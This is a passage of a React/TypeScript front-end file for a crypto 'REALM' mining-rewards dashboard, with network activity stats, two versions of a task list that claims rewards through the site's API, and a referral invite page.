              <p className="text-[10px] font-mono uppercase tracking-[0.2em] text-white/35">Current 6h session</p>
              <p className="mt-3 text-3xl font-luciana text-white">{miningActive ? pendingRewards.toFixed(2) : '0.00'}</p>
              <p className="mt-2 text-xs text-white/40">
                {miningActive ? `${nextSessionPayout.toFixed(2)} REALM left before this session closes.` : 'No session is running. Start one to begin earning again.'}
              </p>
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div className="rounded-2xl border border-white/8 bg-white/[0.02] p-4">
                <p className="text-[10px] font-mono uppercase tracking-[0.2em] text-white/35">Projected daily</p>
                <p className="mt-3 text-2xl font-luciana text-realm-cyan">{projectedDaily}</p>
                <p className="mt-1 text-xs text-white/35">REALM at full activity</p>
              </div>
              <div className="rounded-2xl border border-white/8 bg-white/[0.02] p-4">
                <p className="text-[10px] font-mono uppercase tracking-[0.2em] text-white/35">Projected weekly</p>
                <p className="mt-3 text-2xl font-luciana text-white">{projectedWeekly}</p>
                <p className="mt-1 text-xs text-white/35">REALM at steady uptime</p>
              </div>
            </div>

            <button onClick={() => onNavigate('mining')} className="w-full rounded-xl border border-realm-cyan/20 bg-realm-cyan/10 px-4 py-3 text-left text-sm text-realm-cyan hover:border-realm-cyan/35">
              Open mining controls
            </button>
          </div>
        </div>

        {/* Analytics Section */}
        <div className="col-span-12 glass-panel p-8">
           <div className="flex justify-between items-end mb-8">
             <div>
               <h3 className="font-bold text-xl mb-1">Network activity</h3>
               <p className="text-xs text-white/30">A simple view of your place in the network.</p>
             </div>
             <div className="flex gap-2">
               {['24H', '7D', 'ALL'].map(t => (
                 <button 
                   key={t}
                   onClick={() => setTimeframe(t)}
                   className={cn(
                     "px-3 py-1 rounded-md border text-[10px] font-mono transition-all",
                     timeframe === t 
                       ? "bg-realm-cyan/20 border-realm-cyan text-realm-cyan" 
                       : "bg-white/5 border-white/10 text-white/40 hover:text-white"
                   )}
                 >
                   {t}
                 </button>
               ))}
             </div>
           </div>
                <div className="h-[240px] w-full">
              <ResponsiveContainer width="100%" height="100%">
                <AreaChart data={chartData.length > 0 ? chartData : [{ t: 'Now', v: 0 }]}>
                   <CartesianGrid strokeDasharray="2 4" stroke="rgba(255,255,255,0.04)" vertical={false} />
                   <XAxis dataKey="t" tick={{ fill: 'rgba(255,255,255,0.3)', fontSize: 10 }} />
                   <YAxis hide />
                   <Area type="monotone" dataKey="v" stroke="#2FE6D2" fillOpacity={0.1} fill="#2FE6D2" strokeWidth={1.5} />
                </AreaChart>
              </ResponsiveContainer>
            </div>

            <div className="grid grid-cols-4 gap-8 mt-8 pt-8 border-t border-white/5">
              {[
                { label: 'Active Miners', value: networkStats.activeSessions.toLocaleString() },
                { label: 'Total Users', value: networkStats.totalUsers.toLocaleString() },
                { label: 'Total Mined', value: `${networkStats.totalPointsMined.toFixed(1)} REALM` },
                { label: 'Network Status', value: 'Optimal' },
              ].map(s => (
                <div key={s.label}>
                  <p className="text-[10px] text-white/30 font-mono uppercase mb-1">{s.label}</p>
                  <p className="text-sm font-bold text-white/80">{s.value}</p>
                </div>
              ))}        </div>
        </div>

        <div className="col-span-12 lg:col-span-7 glass-panel p-8">
          <div className="flex items-center justify-between gap-4">
            <div>
              <p className="text-[10px] font-mono uppercase tracking-[0.25em] text-white/35">Recent Activity</p>
              <h3 className="mt-3 text-2xl font-semibold text-white">What changed recently</h3>
            </div>
            <Activity size={18} className="text-realm-cyan" />
          </div>

          <div className="mt-8 space-y-4">
            {activityFeed.map((entry) => (
              <div key={entry.title} className="flex items-start gap-4 rounded-2xl border border-white/8 bg-white/[0.02] p-4">
                <div
                  className={cn(
                    'mt-1 h-2.5 w-2.5 rounded-full',
                    entry.tone === 'cyan' ? 'bg-realm-cyan' : entry.tone === 'amber' ? 'bg-amber-300' : 'bg-white/20'
                  )}
                />
                <div>
                  <p className="text-sm font-semibold text-white">{entry.title}</p>
                  <p className="mt-1 text-sm text-white/45">{entry.detail}</p>
                </div>
              </div>
            ))}
          </div>
        </div>

        <div className="col-span-12 lg:col-span-5 glass-panel p-8">
          <div className="flex items-center justify-between gap-4">
            <div>
              <p className="text-[10px] font-mono uppercase tracking-[0.25em] text-white/35">Next Actions</p>
              <h3 className="mt-3 text-2xl font-semibold text-white">Best next steps</h3>
            </div>
            <Bell size={18} className="text-realm-cyan" />
          </div>

          <div className="mt-8 space-y-3">
            {claimableSoon.length > 0 ? claimableSoon.map((task) => (
              <button
                key={task.id}
                onClick={() => {
                  if (task.category === 'connect' || task.id === 'complete_profile' || task.id === 'connect_wallet') onNavigate('profile');
                  else if (task.id === 'first_referral') onNavigate('referrals');
                  else if (task.id === 'first_mine_session' || task.id === 'daily_mine') onNavigate('mining');
                  else onNavigate('tasks');
                }}
                className="w-full rounded-2xl border border-white/8 bg-white/[0.02] p-4 text-left hover:border-realm-cyan/25"
              >
                <div className="flex items-start justify-between gap-4">
                  <div>
                    <p className="text-sm font-semibold text-white">{task.title}</p>
                    <p className="mt-1 text-xs text-white/40">+{task.reward} REALM • {task.category}</p>
                  </div>
                  <ChevronRight size={16} className="mt-0.5 text-white/30" />
                </div>
              </button>
            )) : blockedTasks.slice(0, 3).map((task) => (
              <button
                key={task.id}
                onClick={() => onNavigate('tasks')}
                className="w-full rounded-2xl border border-white/8 bg-white/[0.02] p-4 text-left hover:border-white/15"
              >
                <div className="flex items-start justify-between gap-4">
                  <div>
                    <p className="text-sm font-semibold text-white">{task.title}</p>
                    <p className="mt-1 text-xs text-white/40">{task.blockedReason || 'Needs another step before it can be claimed.'}</p>
                  </div>
                  <ChevronRight size={16} className="mt-0.5 text-white/30" />
                </div>
              </button>
            ))}
          </div>

          <div className="mt-6 rounded-2xl border border-white/8 bg-white/[0.02] p-4">
            <p className="text-[10px] font-mono uppercase tracking-[0.2em] text-white/35">Identity setup</p>
            <p className="mt-3 text-sm text-white/75">
              {completedProfileChecks}/{profileCheckTotal} checks complete. Finish the remaining identity items to improve recovery and task readiness.
            </p>
            <button onClick={() => onNavigate('profile')} className="mt-4 w-full rounded-xl border border-white/10 px-4 py-3 text-sm text-white/70 hover:border-white/20 hover:text-white">
              Open profile
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};
const TasksPage = () => {
  const [tasks, setTasks] = useState<any[]>([]);
  const [loading, setLoading] = useState(true);

  const fetchTasks = async () => {
    try {
      const res = await fetch('/api/tasks', { credentials: 'include' });
      if (res.ok) {
        const data = await res.json();
        setTasks(data);
      }
    } catch (e) {}
    setLoading(false);
  };

  useEffect(() => {
    fetchTasks();
  }, []);

  const handleTask = async (task: any) => {
    if (task.completed) return;
    
    // For tasks with links, open link first
    if (task.link) {
      window.open(task.link, '_blank');
    }

    try {
      const res = await fetch('/api/tasks/complete', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ taskId: task.id }),
        credentials: 'include'
      });
      if (res.ok) {
        fetchTasks();
      }
    } catch (e) {}
  };

  const completed = tasks.filter(t => t.completed).length;
  const totalReward = tasks.filter(t => t.completed).reduce((sum, t) => sum + t.reward, 0);

  return (
    <div className="space-y-12">
      <section>
        <h1 className="text-serif text-6xl font-medium mb-4">
          Active <span className="text-realm-cyan">Objectives</span>
        </h1>
<p className="text-white/40 font-mono text-[10px] tracking-[0.3em] uppercase">Tasks that help your node grow</p>
      </section>

      <div className="grid grid-cols-4 gap-6">
        {[
          { label: 'Pending tasks', value: loading ? '...' : `${tasks.length - completed}`, icon: CheckSquare },
          { label: 'Completed', value: loading ? '...' : `${completed}`, icon: Activity },
          { label: 'Yield earned', value: loading ? '...' : `${totalReward}`, unit: 'REALM', icon: Trophy, special: true },
          { label: 'Network status', value: 'Optimal', icon: ShieldCheck },
        ].map(card => (
          <div key={card.label} className="glass-panel p-6 flex flex-col items-center text-center gap-3 relative overflow-hidden group">
            <div className="absolute top-0 right-0 w-20 h-20 bg-white/2 rounded-full -mr-10 -mt-10 group-hover:bg-realm-cyan/5 transition-colors" />
            <div className="w-10 h-10 rounded-xl bg-white/5 flex items-center justify-center text-white/30 border border-white/5">
              <card.icon size={18} />
            </div>
            <div>
              <p className="text-[9px] text-white/30 font-mono uppercase tracking-widest mb-1">{card.label}</p>
              <p className={cn(
                "text-2xl font-medium",
                card.special ? "font-luciana text-realm-cyan text-3xl" : "text-white"
              )}>
                {card.value} {card.unit && <span className="text-[10px] opacity-40">{card.unit}</span>}
              </p>
            </div>
          </div>
        ))}
      </div>

      <div className="grid grid-cols-12 gap-8">
        <div className="col-span-12 lg:col-span-8 space-y-4">
          {loading ? (
            <div className="flex items-center justify-center h-64">
              <div className="w-10 h-10 border-2 border-realm-cyan border-t-transparent rounded-full animate-spin" />
            </div>
          ) : tasks.length === 0 ? (
            <div className="glass-panel p-20 text-center space-y-4">
               <Activity size={48} className="mx-auto text-white/10" />
<p className="text-white/40 font-mono text-xs">No tasks are available for this account yet.</p>
            </div>
          ) : (
            tasks.map((task, i) => (
              <motion.div 
                key={task.id}
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ delay: i * 0.05 }}
                className={cn(
                  "glass-panel p-6 flex flex-col md:flex-row items-start md:items-center justify-between gap-6 group transition-all duration-300",
                  task.completed ? "opacity-50 border-realm-cyan/10" : "hover:border-realm-cyan/30 hover:bg-white/[0.01]"
                )}
              >
                <div className="flex-1 space-y-2">
                  <div className="flex items-center gap-3">
                    <h4 className="font-bold text-white tracking-tight">{task.title}</h4>
                    <span className={cn(
                      "px-2 py-0.5 rounded text-[8px] font-mono tracking-tighter uppercase border",
                      task.completed ? "bg-realm-cyan/10 text-realm-cyan border-realm-cyan/20" : "bg-white/5 text-white/40 border-white/5"
                    )}>
                      {task.completed ? 'Synchronized' : task.isDaily ? 'Daily' : 'One-time'}
                    </span>
                  </div>
                  <p className="text-sm text-white/40 leading-relaxed max-w-md">{task.description}</p>
                </div>

                <div className="flex items-center gap-8 w-full md:w-auto">
                   <div className="text-right shrink-0">
                      <p className="text-[9px] text-white/20 font-mono uppercase mb-1">Incentive</p>
                      <p className="font-luciana text-xl text-realm-cyan">+{task.reward} <span className="text-[10px] font-mono opacity-40">REALM</span></p>
                   </div>
                   
                   <button
                    onClick={() => handleTask(task)}
                    disabled={task.completed}
                    className={cn(
                      "flex-1 md:flex-none px-8 py-3 rounded-xl text-xs font-bold transition-all duration-300",
                      task.completed 
                        ? "bg-realm-cyan/5 text-realm-cyan border border-realm-cyan/20 cursor-default" 
                        : "bg-white text-realm-black hover:bg-realm-cyan hover:shadow-[0_0_15px_rgba(61,242,224,0.2)] active:scale-95"
                    )}
                  >
                    {task.completed ? '✓ Verified' : task.link ? 'Execute →' : 'Synchronize'}
                  </button>
                </div>
              </motion.div>
            ))
          )}
        </div>

        <div className="col-span-12 lg:col-span-4 space-y-6">
          <div className="glass-panel p-8 relative overflow-hidden">
            <div className="absolute top-0 right-0 w-32 h-32 bg-realm-cyan/5 -mr-16 -mt-16 blur-3xl rounded-full" />
<h3 className="font-munich text-3xl text-white mb-8">progress <span className="text-realm-cyan">so far</span></h3>
            
            <div className="relative w-40 h-40 mx-auto mb-10">
              <svg className="w-full h-full transform -rotate-90">
                <circle cx="80" cy="80" r="70" stroke="currentColor" strokeWidth="6" fill="transparent" className="text-white/5" />
                <motion.circle cx="80" cy="80" r="70" stroke="currentColor" strokeWidth="6" fill="transparent"
                  strokeDasharray="440"
                  animate={{ strokeDashoffset: 440 * (1 - (tasks.length > 0 ? completed / tasks.length : 0)) }}
                  className="text-realm-cyan shadow-lg"
                  transition={{ duration: 1.5, ease: "easeOut" }}
                />
              </svg>
              <div className="absolute inset-0 flex flex-col items-center justify-center">
                <span className="font-luciana text-5xl text-white">{tasks.length > 0 ? Math.round((completed / tasks.length) * 100) : 0}%</span>
                <span className="text-[9px] text-white/30 font-mono uppercase tracking-[0.2em]">Sync Rate</span>
              </div>
            </div>

            <div className="space-y-4 pt-4 border-t border-white/5">
              <div className="flex justify-between items-center text-[10px] font-mono">
                <span className="text-white/30 uppercase">Node Reliability</span>
                <span className="text-realm-cyan">99.8%</span>
              </div>
              <p className="text-xs text-white/40 leading-relaxed text-center italic font-light">
                {completed === 0 ? '"Establish initial connection to start earnings."' : 
                 completed === tasks.length ? '"Infrastructure fully optimized. Reward multiplier active."' :
                 '"Contributing to network decentralization in real-time."'}
              </p>
            </div>
          </div>

          <motion.div 
            whileHover={{ y: -5 }}
            className="glass-panel p-8 bg-gradient-to-br from-realm-cyan/10 to-transparent border-realm-cyan/20 cursor-help"
          >
             <Zap size={20} className="text-realm-cyan mb-4" />
             <h4 className="font-bold text-white mb-2">Priority Protocols</h4>
             <p className="text-xs text-white/50 leading-relaxed">
               One-time initializations credit higher rewards but do not recur. Daily objectives provide steady accumulation.
             </p>
          </motion.div>
        </div>
      </div>
    </div>
  );
};

const TasksPageV2 = ({ onNavigate }: { onNavigate: (tab: string) => void }) => {
  const [tasks, setTasks] = useState<any[]>([]);
  const [user, setUser] = useState<any | null>(null);
  const [loading, setLoading] = useState(true);
  const [activeFilter, setActiveFilter] = useState('all');
  const [processingTaskId, setProcessingTaskId] = useState<string | null>(null);
  const [feedback, setFeedback] = useState<{ type: 'success' | 'error'; text: string } | null>(null);

  const fetchTasks = async () => {
    try {
      const [taskRes, userRes] = await Promise.all([
        fetch('/api/tasks', { credentials: 'include' }),
        fetch('/api/auth/me', { credentials: 'include' }),
      ]);

      if (taskRes.ok) {
        const data = await taskRes.json();
        const nextTasks = Array.isArray(data) && data.length > 0 ? data : [...TASKS_FALLBACK];
        setTasks(sortTasksForDisplay(nextTasks));
      } else {
        setTasks(sortTasksForDisplay([...TASKS_FALLBACK]));
      }

      if (userRes.ok) {
        setUser(await userRes.json());
      } else if (userRes.status === 401) {
        setUser(null);
      }
    } catch (e) {
      setTasks(sortTasksForDisplay([...TASKS_FALLBACK]));
      setFeedback({ type: 'error', text: 'Task API failed, so fallback tasks are being shown.' });
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchTasks();
  }, []);

  const completeTask = async (task: any) => {
    const res = await fetch('/api/tasks/complete', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ taskId: task.id }),
      credentials: 'include',
    });

    const data = await res.json().catch(() => ({}));
    if (!res.ok) {
      throw new Error(data.message || data.error || 'Unable to complete task');
    }

    window.dispatchEvent(new Event('balance-updated'));
    const referralBonus = data.referralBonus ? ` and +${Number(data.referralBonus).toFixed(2)} referral bonus` : '';
    setFeedback({ type: 'success', text: `${task.title} completed. +${Number(data.reward || task.reward).toFixed(2)} REALM credited${referralBonus}.` });
    await fetchTasks();
  };

  const handleTask = async (task: any) => {
    if (task.completed || processingTaskId) return;

    setFeedback(null);
    setProcessingTaskId(task.id);

    try {
      if (task.actionType === 'oauth' && task.actionHref) {
        const returnTo = encodeURIComponent('/?tab=tasks');
        window.location.href = `${task.actionHref}?returnTo=${returnTo}`;
        return;
      }

      if (task.actionType === 'wallet') {
        onNavigate('profile');
        setFeedback({ type: 'error', text: 'Open the profile menu and connect your wallet from the identity panel.' });
        return;
      }

      if (!task.eligible && task.blockedReason) {
        throw new Error(task.blockedReason);
      }

      if (task.actionHref) {
        window.open(task.actionHref, '_blank', 'noopener,noreferrer');
      }

      await completeTask(task);
    } catch (error: any) {
      setFeedback({ type: 'error', text: error.message || 'Task execution failed.' });
    } finally {
      setProcessingTaskId(null);
    }
  };

  const openRequirement = (task: any) => {
    if (task.id === 'complete_profile' || task.id === 'connect_wallet') return onNavigate('profile');
    if (task.id === 'first_referral') return onNavigate('referrals');
    if (task.id === 'first_mine_session' || task.id === 'daily_mine') return onNavigate('mining');
  };

  const completed = tasks.filter((task) => task.completed).length;
  const totalReward = tasks.filter((task) => task.completed).reduce((sum, task) => sum + task.reward, 0);
  const readyToClaim = tasks.filter((task) => !task.completed && task.eligible).length;
  const visibleTasks = sortTasksForDisplay(tasks.filter((task) => activeFilter === 'all' || task.category === activeFilter));
  const filters = [
    { id: 'all', label: 'All' },
    { id: 'connect', label: 'Connect' },
    { id: 'community', label: 'Community' },
    { id: 'daily', label: 'Daily' },
    { id: 'milestone', label: 'Milestones' },
  ];
  const groupedTasks = visibleTasks.reduce((groups: Record<string, any[]>, task: any) => {
    const key = task.category || 'other';
    groups[key] = groups[key] || [];
    groups[key].push(task);
    return groups;
  }, {});
  const visibleGroups = activeFilter === 'all'
    ? TASK_CATEGORY_ORDER.filter((category) => groupedTasks[category]?.length)
    : [activeFilter].filter((category) => groupedTasks[category]?.length);
  const categoryLabels: Record<string, string> = {
    connect: 'Connect',
    milestone: 'Milestones',
    community: 'Community',
    daily: 'Daily',
  };

  return (
    <div className="space-y-8 lg:space-y-10">
      <section className="space-y-4">
        <div className="flex flex-col gap-4 xl:flex-row xl:items-end xl:justify-between">
          <div className="space-y-3">
            <h1 className="text-serif text-4xl font-medium sm:text-5xl lg:text-6xl">
              Tasks <span className="text-realm-cyan">Control Room</span>
            </h1>
            <p className="max-w-2xl text-sm text-white/50 sm:text-base">
              Connect accounts, execute community actions, and claim rewards only when the requirement is actually satisfied.
            </p>
          </div>

          <div className="glass-panel px-4 py-3 sm:px-5 sm:py-4">
            <p className="text-[10px] font-mono uppercase tracking-[0.25em] text-white/35">Session</p>
            <p className="mt-2 text-sm text-white/75">
              {user ? `Signed in as ${user.name || user.username || user.email || 'active node'}` : 'Not signed in'}
            </p>
          </div>
        </div>

        {feedback && (
          <div
            className={cn(
              'glass-panel px-4 py-3 text-sm',
              feedback.type === 'success' ? 'border-realm-cyan/30 text-realm-cyan' : 'border-red-400/25 text-red-300',
            )}
          >
            {feedback.text}
          </div>
        )}
      </section>

      <div className="grid grid-cols-1 gap-4 sm:grid-cols-2 xl:grid-cols-4">
        {[
          { label: 'Ready To Claim', value: loading ? '...' : `${readyToClaim}`, icon: Zap },
          { label: 'Completed', value: loading ? '...' : `${completed}`, icon: CheckSquare },
          { label: 'Rewards Earned', value: loading ? '...' : `${totalReward}`, unit: 'REALM', icon: Trophy, special: true },
          { label: 'Identity Links', value: loading ? '...' : `${tasks.filter((task) => task.category === 'connect' && task.completed).length}/4`, icon: ShieldCheck },
        ].map((card) => (
          <div key={card.label} className="glass-panel p-5 sm:p-6">
            <div className="flex items-start justify-between gap-4">
              <div>
                <p className="text-[10px] text-white/35 font-mono uppercase tracking-[0.25em]">{card.label}</p>
                <p className={cn('mt-3 text-3xl font-medium', card.special ? 'font-luciana text-realm-cyan' : 'text-white')}>
                  {card.value}
                  {card.unit && <span className="ml-2 text-xs text-white/35">{card.unit}</span>}
                </p>
              </div>
              <div className="flex h-11 w-11 items-center justify-center rounded-2xl border border-white/8 bg-white/5 text-white/55">
                <card.icon size={18} />
              </div>
            </div>
          </div>
        ))}
      </div>

      <div className="grid grid-cols-1 gap-8 xl:grid-cols-[minmax(0,1fr)_320px]">
        <div className="space-y-5">
          <div className="flex flex-wrap gap-2">
            {filters.map((filter) => (
              <button
                key={filter.id}
                onClick={() => setActiveFilter(filter.id)}
                className={cn(
                  'rounded-full border px-4 py-2 text-xs font-mono uppercase tracking-[0.2em] transition-colors',
                  activeFilter === filter.id
                    ? 'border-realm-cyan/30 bg-realm-cyan/10 text-realm-cyan'
                    : 'border-white/8 bg-white/[0.02] text-white/45 hover:border-white/15 hover:text-white/75',
                )}
              >
                {filter.label}
              </button>
            ))}
          </div>

          {loading ? (
            <div className="glass-panel flex h-56 items-center justify-center">
              <div className="h-10 w-10 animate-spin rounded-full border-2 border-realm-cyan border-t-transparent" />
            </div>
          ) : visibleTasks.length === 0 ? (
            <div className="glass-panel p-10 text-center">
              <Activity size={42} className="mx-auto text-white/15" />
              <p className="mt-4 text-sm text-white/45">No tasks match this filter.</p>
            </div>
          ) : (
            visibleGroups.map((groupKey) => (
              <div key={groupKey} className="space-y-4">
                <div className="flex items-center justify-between px-1">
                  <h3 className="text-sm font-mono uppercase tracking-[0.3em] text-white/40">
                    {categoryLabels[groupKey] || groupKey}
                  </h3>
                  <span className="text-[10px] font-mono uppercase tracking-[0.2em] text-white/25">
                    {groupedTasks[groupKey].length} task{groupedTasks[groupKey].length === 1 ? '' : 's'}
                  </span>
                </div>

                {groupedTasks[groupKey].map((task: any, index: number) => (
                  <motion.div
                    key={task.id}
                    initial={{ opacity: 0, y: 12 }}
                    animate={{ opacity: 1, y: 0 }}
                    transition={{ delay: index * 0.04 }}
                    className={cn(
                      'glass-panel p-5 sm:p-6',
                      task.completed ? 'border-realm-cyan/15 bg-realm-cyan/[0.03]' : 'hover:border-white/12',
                    )}
                  >
                    <div className="flex flex-col gap-5">
                      <div className="flex flex-col gap-3 lg:flex-row lg:items-start lg:justify-between">
                        <div className="space-y-3">
                          <div className="flex flex-wrap items-center gap-2">
                            <span className="rounded-full border border-white/8 bg-white/[0.03] px-3 py-1 text-[10px] font-mono uppercase tracking-[0.25em] text-white/40">
                              {task.category}
                            </span>
                            <span
                              className={cn(
                                'rounded-full border px-3 py-1 text-[10px] font-mono uppercase tracking-[0.25em]',
                                task.completed
                                  ? 'border-realm-cyan/20 bg-realm-cyan/10 text-realm-cyan'
                                  : task.eligible
                                    ? 'border-emerald-400/20 bg-emerald-400/10 text-emerald-300'
                                    : 'border-white/8 bg-white/[0.03] text-white/45',
                              )}
                            >
                              {task.completed ? 'Completed' : task.eligible ? 'Ready' : 'Blocked'}
                            </span>
                            <span className="text-[10px] font-mono uppercase tracking-[0.25em] text-white/30">
                              {task.type === 'daily' ? 'Daily' : 'One-time'}
                            </span>
                          </div>

                          <div>
                            <h3 className="text-xl font-semibold tracking-tight text-white">{task.title}</h3>
                            <p className="mt-2 max-w-2xl text-sm leading-6 text-white/50">{task.description}</p>
                          </div>
                        </div>

                        <div className="rounded-2xl border border-realm-cyan/15 bg-realm-cyan/[0.04] px-4 py-3 text-left lg:text-right">
                          <p className="text-[10px] font-mono uppercase tracking-[0.25em] text-white/35">Reward</p>
                          <p className="mt-2 font-luciana text-2xl text-realm-cyan">+{task.reward}</p>
                        </div>
                      </div>

                      {!task.completed && task.blockedReason && (
                        <div className="rounded-2xl border border-amber-300/10 bg-amber-300/[0.05] px-4 py-3 text-sm text-amber-100/80">
                          {task.blockedReason}
                        </div>
                      )}

                      <div className="flex flex-col gap-3 sm:flex-row sm:flex-wrap sm:items-center sm:justify-between">
                        <div className="text-xs font-mono uppercase tracking-[0.2em] text-white/30">
                          {task.completed ? 'Reward synchronized' : task.eligible ? 'Execution available now' : 'Resolve prerequisite first'}
                        </div>

                        <div className="flex flex-col gap-2 sm:flex-row">
                          {!task.completed && !task.eligible && ['complete_profile', 'connect_wallet', 'first_referral', 'first_mine_session', 'daily_mine'].includes(task.id) && (
                            <button
                              onClick={() => openRequirement(task)}
                              className="rounded-xl border border-white/10 px-4 py-3 text-xs font-bold text-white/70 transition-colors hover:border-white/20 hover:text-white"
                            >
                              Open Requirement
                            </button>
                          )}

                          <button
                            onClick={() => handleTask(task)}
                            disabled={task.completed || processingTaskId === task.id}
                            className={cn(
                              'rounded-xl px-5 py-3 text-xs font-bold transition-all',
                              task.completed
                                ? 'cursor-default border border-realm-cyan/20 bg-realm-cyan/5 text-realm-cyan'
                                : 'bg-white text-realm-black hover:bg-realm-cyan disabled:opacity-70',
                            )}
                          >
                            {task.completed
                              ? 'Completed'
                              : processingTaskId === task.id
                                ? 'Working...'
                                : task.primaryAction || 'Execute'}
                          </button>
                        </div>
                      </div>
                    </div>
                  </motion.div>
                ))}
              </div>
            ))
          )}
        </div>

        <div className="space-y-5">
          <div className="glass-panel p-6 sm:p-8">
<h3 className="font-munich text-3xl text-white">mission progress</h3>
            <div className="mt-8 flex items-center justify-center">
              <div className="relative flex h-40 w-40 items-center justify-center rounded-full border border-white/8">
                <div className="absolute inset-3 rounded-full border border-realm-cyan/20" />
                <div className="text-center">
                  <p className="font-luciana text-4xl text-white">{tasks.length ? Math.round((completed / tasks.length) * 100) : 0}%</p>
                  <p className="mt-1 text-[10px] font-mono uppercase tracking-[0.25em] text-white/35">Completion</p>
                </div>
              </div>
            </div>

            <div className="mt-8 space-y-4 border-t border-white/6 pt-6">
              <div className="flex items-center justify-between text-xs font-mono uppercase tracking-[0.2em] text-white/40">
                <span>Claimable now</span>
                <span className="text-realm-cyan">{readyToClaim}</span>
              </div>
              <div className="flex items-center justify-between text-xs font-mono uppercase tracking-[0.2em] text-white/40">
                <span>Community tasks</span>
                <span>{tasks.filter((task) => task.category === 'community').length}</span>
              </div>
              <div className="flex items-center justify-between text-xs font-mono uppercase tracking-[0.2em] text-white/40">
                <span>Daily tasks</span>
                <span>{tasks.filter((task) => task.category === 'daily').length}</span>
              </div>
            </div>
          </div>

          <div className="glass-panel border-realm-cyan/20 bg-gradient-to-br from-realm-cyan/[0.09] to-transparent p-6 sm:p-8">
            <Zap size={18} className="text-realm-cyan" />
            <h4 className="mt-4 text-lg font-semibold text-white">How execution works now</h4>
            <p className="mt-3 text-sm leading-6 text-white/55">
              Connect tasks launch the correct OAuth flow, community tasks open the external destination and then claim, and blocked tasks now explain exactly what is missing.
            </p>
          </div>
        </div>
      </div>

    </div>
  );
};

const ReferralsPage = () => {
  const [copied, setCopied] = useState(false);
  const [referrals, setReferrals] = useState<any[]>([]);
  const [loading, setLoading] = useState(true);
  const [referralCode, setReferralCode] = useState('REALM-ALPHA-??');
  const [showAllReferrals, setShowAllReferrals] = useState(false);
  const referralLink = buildReferralLink(referralCode);

  const handleCopy = async (text: string) => {
    try {
      await navigator.clipboard.writeText(text);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    } catch (err) {
      console.error('Failed to copy', err);
    }
  };

  useEffect(() => {
    const fetchReferrals = async () => {
      try {
        const res = await fetch('/api/referral', { credentials: 'include' });
        if (res.ok) {
          const data = await res.json();
          setReferrals(data.referrals || []);
          if (data.code) setReferralCode(data.code);
        }
      } catch (e) {}
      setLoading(false);
    };
    fetchReferrals();
  }, []);

  const totalRewards = referrals.reduce((sum: number, r: any) => sum + (r.rewardEarned || 0), 0);
  const activeNodes = referrals.filter((r: any) => r.status === 'active').length;

  return (
    <div className="space-y-10">
      <section>
<h1 className="text-serif text-6xl font-medium mb-4">Invite & <span className="text-realm-cyan">Earn</span></h1>
<p className="text-white/50 font-mono text-sm tracking-wide">Invite people you trust and earn when they stay active.</p>
      </section>

      <div className="grid grid-cols-3 gap-6">
        {[
          { label: 'Total Referrals', value: loading ? '...' : `${referrals.length}` },
          { label: 'Active Nodes', value: loading ? '...' : `${activeNodes}` },
          { label: 'Rewards Earned', value: loading ? '...' : `${totalRewards.toFixed(2)}`, unit: 'REALM-P' },
        ].map(stat => (
          <div key={stat.label} className="glass-panel p-8 text-center">
            <p className="text-[10px] text-white/40 font-mono uppercase tracking-widest mb-2">{stat.label}</p>
            <p className="text-3xl font-medium">{stat.value} {stat.unit && <span className="text-xs text-realm-cyan">{stat.unit}</span>}</p>
          </div>
        ))}
      </div>

      <div className="grid grid-cols-12 gap-6">
        <div className="col-span-7 glass-panel p-8">
<h3 className="text-serif text-2xl mb-8">Your invite link</h3>
          <div className="space-y-6">
            <div className="p-4 bg-white/5 border border-white/10 rounded-xl flex items-center justify-between group">
              <code className="text-sm font-mono text-white/60">{referralLink}</code>
              <button onClick={() => handleCopy(referralLink)} className="text-xs font-mono text-realm-cyan hover:underline">
                {copied ? 'Copied!' : 'Copy Link'}
              </button>
            </div>
            <div className="p-4 bg-white/5 border border-white/10 rounded-xl flex items-center justify-between">
              <div>
                <p className="text-[10px] text-white/40 font-mono uppercase mb-1">Referral Code</p>
                <code className="text-xl font-medium tracking-widest">{referralCode}</code>
              </div>
              <button
                onClick={() => handleCopy(referralCode)}
                className="px-6 py-2 bg-white text-realm-black rounded-lg text-xs font-bold hover:bg-realm-cyan transition-all"
              >
                {copied ? 'Copied' : 'Share Code'}
              </button>
            </div>
          </div>

          <div className="mt-8 p-6 bg-realm-cyan/5 border border-realm-cyan/10 rounded-2xl">
            <h4 className="font-medium mb-2">How it works</h4>
            <p className="text-sm text-white/50 leading-relaxed">
              Earn 10% of every REALM reward generated by nodes you refer. Referral rewards are credited automatically to your wallet balance.
            </p>
          </div>
        </div>

        <div className="col-span-5 glass-panel p-8">
<h3 className="text-serif text-2xl mb-6">People you invited</h3>
          {loading ? (
            <div className="flex items-center justify-center h-40">
              <div className="w-6 h-6 border-2 border-realm-cyan border-t-transparent rounded-full animate-spin" />
            </div>
          ) : referrals.length === 0 ? (
            <div className="flex flex-col items-center justify-center h-40 text-center gap-3">
              <Users size={32} className="text-white/20" />
              <p className="text-sm text-white/40">No referrals yet.</p>
<p className="text-xs text-white/25 font-mono">Share your link and track who has joined through you.</p>
            </div>
          ) : (
            <div className="space-y-4">
              {referrals.map((r: any, i: number) => (
                <div key={i} className="flex items-center justify-between group">
                  <div className="flex items-center gap-3">
                    <div className="w-8 h-8 rounded-full bg-white/5 border border-white/10 flex items-center justify-center text-[10px] font-mono text-white/40">
                      {(r.name || r.address || 'U')[0].toUpperCase()}
                    </div>
                    <div>
                      <p className="text-sm font-medium">{r.name || r.address?.slice(0, 10) + '...' || 'Anonymous'}</p>
                      <p className="text-[10px] text-white/40 font-mono">{r.event || 'Node Activated'}</p>
                    </div>
                  </div>
                  <div className="text-right">
                    <p className={cn("text-xs font-mono", r.rewardEarned ? "text-realm-cyan" : "text-white/20")}>
                      {r.rewardEarned ? `+${r.rewardEarned} REALM-P` : 'Pending'}
                    </p>
                    <p className="text-[10px] text-white/30 font-mono">{r.time || 'recently'}</p>
                  </div>
                </div>
              ))}
            </div>
          )}
          <button onClick={() => setShowAllReferrals(true)} className="w-full py-3 mt-8 border border-white/10 rounded-xl text-sm font-medium hover:bg-white/5 transition-colors">
            View All Referrals
          </button>
        </div>
